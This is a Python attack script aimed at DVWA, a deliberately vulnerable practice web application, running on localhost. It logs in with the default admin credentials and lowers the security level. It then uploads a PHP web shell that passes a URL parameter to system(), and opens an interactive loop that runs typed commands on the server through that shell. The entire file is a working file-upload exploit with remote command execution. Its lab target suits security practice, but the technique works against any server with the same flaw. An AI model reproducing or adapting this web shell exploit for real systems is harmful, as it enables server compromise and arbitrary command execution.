import requests 
import re
from time import time
from bs4 import BeautifulSoup


url='http://127.0.0.1/DVWA/vulnerabilities/upload/'

login='http://127.0.0.1/DVWA/login.php'
security='http://127.0.0.1/DVWA/security.php'

username='admin'
password='password'

session=requests.session()
r=session.get(login)

token=re.search("value=.*'",r.text).group(0)
user_token=token.split('=')[1].strip("'")

# print(user_token)


postdata={
    'username':username,
    'password':password,
    'Login':'Login',
    'user_token':user_token
    }

proxy={
    'http':'http://127.0.0.1:8080'
    }
secdata={
    'security':'low',
    'seclev_submit':'Submit',
    'user_token':user_token
    }
p=session.post(login,data=postdata)
secu=session.post(security,data=secdata)

# print(secu.text)

filename = f"{int(time())}-shell.php"

print(filename)
header = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type" : "multipart/form-data; boundary=---------------------------149136883339534940181535313062",
        "Origin": "http://localhost",
        "Connection": "close",
        "Referer": "http://localhost/DVWA/vulnerabilities/upload/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    }

data  =f"""-----------------------------149136883339534940181535313062\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n-----------------------------149136883339534940181535313062\r\nContent-Disposition: form-data; name="uploaded"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n<!DOCTYPE html><body><div><pre class="command"><?php  system($_GET['cmd']); ?></pre></div></body></html>\r\n-----------------------------149136883339534940181535313062\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n-----------------------------149136883339534940181535313062--\r\n"""

res = session.post(url,data=data,headers=header)

# Print the file name
# print(re.findall(r"[a-zA-Z\/\-0-9\.]+.php succesfully uploaded!", res.text)[0])


if re.search(r"succesfully", res.text):
    print("Successfully Upload file")
else:
    print("Somethings wrong")

def shell(command):
    
    url = f"http://127.0.0.1/DVWA/hackable/uploads/{filename}?cmd={command}"
    res = session.get(url)
    soup = BeautifulSoup(res.text, "html.parser")
    print(soup.find("pre", class_="command").text)
    
    
while(True):
    input_command = input("# ")
    shell(input_command)